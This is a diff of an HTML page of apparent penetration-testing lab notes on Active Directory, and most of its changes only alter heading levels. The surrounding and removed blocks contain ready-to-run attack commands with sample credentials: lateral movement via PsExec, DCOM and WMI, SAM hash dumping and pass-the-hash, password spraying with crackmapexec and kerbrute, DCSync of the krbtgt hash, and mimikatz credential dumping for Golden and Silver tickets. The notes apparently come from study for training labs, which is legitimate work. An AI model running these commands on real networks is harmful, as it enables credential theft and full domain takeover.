-<h2 id="psexec"><a class="header" href="#psexec">PsExec</a></h2>
+<h3 id="psexec"><a class="header" href="#psexec">PsExec</a></h3>
 <pre><code>
 ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 hostname
@@ -5054,7 +5124,7 @@ ls \\web04\backup
 
 
 </code></pre>
-<h2 id="dcom"><a class="header" href="#dcom">DCOM</a></h2>
+<h3 id="dcom"><a class="header" href="#dcom">DCOM</a></h3>
 <pre><code>
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.189.72"))
 
@@ -5069,7 +5139,7 @@ whoami
 hostname
 
 </code></pre>
-<h2 id="wmi-and-winrm"><a class="header" href="#wmi-and-winrm">WMI and WinRM</a></h2>
+<h3 id="wmi-and-winrm"><a class="header" href="#wmi-and-winrm">WMI and WinRM</a></h3>
 <pre><code>
 
 wmic /node:192.168.189.73 /user:jen /password:Nexus123! process call create "calc"
@@ -5112,7 +5182,7 @@ hostname
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h2>
 <h3 id="sam-dumping"><a class="header" href="#sam-dumping">SAM Dumping</a></h3>
 <pre><code>Dumping the SAM hashes on Victim
 
@@ -5132,42 +5202,11 @@ samdump2 system sam # Less Reliable
 
 crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
 </code></pre>
-<h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
-<pre><code>
-xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
-net accounts
-
-$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-$PDC = ($domainObj.PdcRoleOwner).Name
-$SearchString = "LDAP://"
-$SearchString += $PDC + "/"
-$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-$SearchString += $DistinguishedName
-New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
-
-cd C:\Tools
-powershell -ep bypass
-.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
-
-
-cat users.txt
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-
-
-crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
-
-type .\usernames.txt
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-
-
-Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
-</code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="persistence"><a class="header" href="#persistence">Persistence</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
 <p>With krbtgt, We can create a Golden ticket.</p>
-<h3 id="links-9"><a class="header" href="#links-9">Links</a></h3>
+<h3 id="links-19"><a class="header" href="#links-19">Links</a></h3>
 <ul>
 <li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">LSA Dump</a></li>
-<li></li>
 </ul>
 <h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
 <pre><code># Assuming that Victim account is member of Domain Admin or we have compromised the DC.
@@ -5204,7 +5243,7 @@ impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerora
 </code></pre>
 <p>We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.</p>
 <h3 id="other-notes-1"><a class="header" href="#other-notes-1">Other Notes</a></h3>
-<h2 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h2>
+<h3 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h3>
 <pre><code>iwr -UseDefaultCredentials http://web04
 privilege::debug
 sekurlsa::logonpasswords
